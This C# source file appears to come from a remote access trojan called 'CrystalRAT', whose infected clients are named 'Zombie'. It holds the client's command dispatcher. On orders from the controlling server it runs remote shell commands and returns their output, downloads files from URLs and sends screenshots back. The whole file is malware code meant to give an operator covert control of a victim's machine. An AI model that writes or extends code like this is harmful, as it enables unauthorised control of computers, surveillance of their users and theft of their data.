using CrystalRATShared.Commands;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Zombie.Web;

namespace Zombie.Functions
{
    public static class FunctionManager
    {

        public static void Process(CommandFlags flag, BinaryReader reader)
        {
            switch (flag)
            {
                case CommandFlags.DataCorrupted:
                    Client.RestartSocket();
                    break;
                case CommandFlags.RemoteCMD:
                    Client.Send(RemoteCMD.ExecuteCommand(reader.ReadString()));
                    break;
                case CommandFlags.ZombieDownloadFileRequest:
                    Client.Send(Download.FromURL(reader.ReadString(), reader.ReadString()));
                    break;
                case CommandFlags.Screenshot:
                    Client.Send(Screenshot.Take());
                    break;

            }
        }

    }
}
